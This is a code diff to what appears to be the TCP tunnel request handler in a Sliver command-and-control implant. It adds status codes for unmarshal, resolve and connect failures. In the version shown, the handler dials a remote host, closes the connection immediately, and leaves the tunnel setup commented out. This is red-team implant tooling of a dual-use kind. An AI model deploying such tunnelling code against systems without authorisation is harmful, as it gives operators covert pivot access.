@@ -19,10 +19,8 @@ package handlers
 */
 
 import (
-	"bufio"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"net"
 	"time"
 
@@ -39,6 +37,11 @@ import (
 
 const (
 	readBufSize = 1024
+
+	successfulTCPTunnelReq          = 0x00
+	failedMessageUnmarshalErrorCode = 0xF0
+	failedTCPRemoteHostResolve      = 0xF1
+	failedTCPRemoteHostConnect      = 0xF2
 )
 
 var (
@@ -230,10 +233,25 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 func tcpTunnelReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
 	fmt.Println("A call to tcpTunnelReqHandler()")
 
+	returnStatusCode := func(statusCode byte, connection *transports.Connection) {
+		// {{if .Debug}}
+		log.Printf("Returning status code for tcptunnel %d\n", statusCode)
+		log.Printf("Connection object %s\n", connection)
+		// {{end}}
+		tcpTunnelResp, _ := proto.Marshal(&sliverpb.TCPTunnel{
+			StatusCode: uint32(statusCode),
+		})
+		connection.Send <- &sliverpb.Envelope{
+			ID: envelope.ID,
+			Data: tcpTunnelResp,
+		}
+	}
+
 	tcpTunnelReq := &sliverpb.TCPTunnelReq{}
 	err := proto.Unmarshal(envelope.Data, tcpTunnelReq)
 	if err != nil {
 		fmt.Println("Failed unmarshel request")
+		returnStatusCode(failedMessageUnmarshalErrorCode, connection)
 		return
 	}
 
@@ -245,24 +263,29 @@ func tcpTunnelReqHandler(envelope *sliverpb.Envelope, connection *transports.Con
 	fmt.Println(remoteAddressString)
 	remoteAddress, err := net.ResolveTCPAddr("tcp4", remoteAddressString)
 	if err != nil {
-		fmt.Println("Failed resolving remote address")
+		fmt.Println("Failed resolve tcp address")
+		returnStatusCode(failedTCPRemoteHostResolve, connection)
 		return
 	}
 
 	remoteConn, err := net.DialTCP("tcp4", nil, remoteAddress)
 	if err != nil {
-		fmt.Println("Failed connecting to remote address")
+		fmt.Println("Failed connecting to remote tcp address")
+		returnStatusCode(failedTCPRemoteHostConnect, connection)
 		return
 	}
+	remoteConn.Close()
+	returnStatusCode(successfulTCPTunnelReq, connection)
 
-	tcpReadCloser := struct {
-		tcpSocket
-	}
+	//
+	//tcpReadCloser := struct {
+	//	tcpSocket
+	//}
 
-	tunnel := &transports.Tunnel{
-		ID:     tcpTunnelReq.TunnelID,
-		Reader: ioutil.NopCloser(bufio.NewReader(remoteConn)),
-		Writer: bufio.NewWriter(remoteConn),
-	}
-	connection.AddTunnel(tunnel)
+	//tunnel := &transports.tTunnel{
+	//	ID:     tcpTunnelReq.TunnelID,
+	//	Reader: ioutil.NopCloser(bufio.NewReader(remoteConn)),
+	//	Writer: remoteConn,
+	//}
+	//connection.AddTunnel(tunnel)
 }
